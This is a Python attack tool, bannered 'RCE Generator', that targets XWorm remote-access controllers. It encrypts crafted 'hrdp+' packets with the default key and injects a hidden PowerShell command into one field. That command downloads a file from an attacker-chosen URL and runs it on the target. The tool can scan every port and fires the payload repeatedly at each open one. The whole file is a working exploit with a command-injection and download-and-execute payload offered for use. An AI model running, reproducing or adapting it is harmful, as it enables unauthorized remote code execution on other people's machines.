import socket
import io
import random
import string
import hashlib
import os
import sys
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from colorama import Fore, init

init(autoreset=True)

def clear_screen():
    os.system('cls' if sys.platform == 'win32' else 'clear')

def genid(length):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

class Packet:
    def __init__(self, data: list[bytes]):
        self.data = data

    def get_bytes(self):
        b = io.BytesIO()
        b.write(b'<Xwormmm>'.join(self.data))
        return b.getbuffer().tobytes()

def sendpacket(sock, packet, key):
    try:
        key_hash = hashlib.md5(key.encode('utf-8')).digest()
        crypto = AES.new(key_hash, AES.MODE_ECB)
        encrypted = crypto.encrypt(pad(packet.get_bytes(), 16))
        sock.send(str(len(encrypted)).encode('utf-8') + b'\x00')
        sock.send(encrypted)
        return True
    except:
        return False

def execute_payload(host, port, key, file_url):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
    
        print(Fore.GREEN + f"Successfully Connected To {host}" + Fore.RESET)

        client_id = genid(16)
        handshake_packet = Packet([b'hrdp', client_id.encode('utf-8')])
        if not sendpacket(sock, handshake_packet, key):
            print(Fore.RED + "Decline" + Fore.RESET)
            sock.close()
            return False

        file_extension = '.bat' if file_url.lower().endswith('.bat') else '.exe'
        random_filename = genid(5) + file_extension

        if file_extension == '.bat':
            ps_command = f'start powershell.exe -WindowStyle Hidden $url = "{file_url}"; $outputPath = "$env:TEMP\\{random_filename}"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Process -FilePath \'cmd.exe\' -ArgumentList \'/c\', $outputPath'
        else:
            ps_command = f'''start powershell.exe -WindowStyle Hidden $url = "{file_url}"; $outputPath = "$env:TEMP\\{random_filename}"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Sleep -s 3; cmd.exe /c start "" $outputPath'''

        exploit_packet = Packet([
            b'hrdp+',
            client_id.encode('utf-8'),
            b' lol',
            f'" & {ps_command}'.encode('utf-8'),
            b'1:1'
        ])
        
        if not sendpacket(sock, exploit_packet, key):
            print(Fore.RED + "Decline" + Fore.RESET)
            sock.close()
            return False

        sock.close()
        return True
        
    except socket.timeout:
        print(Fore.RED + "Decline" + Fore.RESET)
    except ConnectionRefusedError:
        print(Fore.RED + "Decline" + Fore.RESET)
    except Exception:
        print(Fore.RED + "Decline" + Fore.RESET)
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
    return False

def show_banner():
    print(Fore.RED + r"""
                                                                            
██████╗░░█████╗░███████╗  ░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
██╔══██╗██╔══██╗██╔════╝  ██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
██████╔╝██║░░╚═╝█████╗░░  ██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
██╔══██╗██║░░██╗██╔══╝░░  ██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
██║░░██║╚█████╔╝███████╗  ╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
╚═╝░░╚═╝░╚════╝░╚══════╝  ░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
                                                                                                                                                                                
                        Coded By laa3een
                        
                        discord.gg/4XhVJznm8
                
""" + Fore.RESET)

def main():
    clear_screen()
    show_banner()
    
    print(Fore.RED + "# Configure database connection" + Fore.RESET)
    print(Fore.RED + "* Please enter connection details:" + Fore.RESET)
    
    host = input(Fore.RED + "[*] Enter IP-Address/Hostname. Example: (127.0.0.1): " + Fore.RESET)
    
    print(Fore.RED + "[1] Manual Port" + Fore.RESET)
    print(Fore.RED + "[2] Full Scan (1-65535)" + Fore.RESET)
    scan_mode = input(Fore.RED + "[*] Choose scan mode (1 or 2): " + Fore.RESET)
    
    port = None
    if scan_mode == '1':
        port = int(input(Fore.RED + "[*] Enter Port Number: " + Fore.RESET))
    elif scan_mode == '2':
        port = None
    else:
        print(Fore.RED + "[!] Invalid choice. Exiting..." + Fore.RESET)
        return
    
    key = input(Fore.RED + "[*] Encryption key default: `<123456789>': `<123456789>`" + Fore.RESET)
    if not key:
        key = "<123456789>"
    
    file_url = input(Fore.RED + "[*] Payload URL to download. Example: (https://example.com/file.exe): " + Fore.RESET)
    
    print(Fore.RED + f"\n[*] Target: {host}" + Fore.RESET)
    
    if scan_mode == '1':
        print(Fore.RED + f"[*] Target Port: {port}" + Fore.RESET)
        print(Fore.RED + f"[*] Encryption Key: {key}" + Fore.RESET)
        print(Fore.RED + f"[*] Payload URL: {file_url}" + Fore.RESET)
        print(Fore.RED + "[*] Starting attack...\n" + Fore.RESET)
        
        while True:
            execute_payload(host, port, key, file_url)
            time.sleep(5)
    
    elif scan_mode == '2':
        print(Fore.RED + "[*] Scan Mode: Full Port Scan (1-65535)" + Fore.RESET)
        print(Fore.RED + f"[*] Encryption Key: {key}" + Fore.RESET)
        print(Fore.RED + f"[*] Payload URL: {file_url}" + Fore.RESET)
        print(Fore.RED + "[*] Starting full scan...\n" + Fore.RESET)
        
        while True:
            for p in range(1, 65536):
                try:
                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_sock.settimeout(0.3)
                    if test_sock.connect_ex((host, p)) == 0:
                        print(Fore.GREEN + f"[+] {host}:{p} is open" + Fore.RESET)
                        execute_payload(host, p, key, file_url)
                    test_sock.close()
                except:
                    pass
                
                if p % 1000 == 0:
                    print(Fore.YELLOW + f"[*] Progress: {p}/65535 ports scanned..." + Fore.RESET)
            
            print(Fore.YELLOW + "[*] Scan completed. Restarting...\n" + Fore.RESET)
            time.sleep(30)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Operation cancelled by user" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"[!] Critical error: {str(e)}" + Fore.RESET)
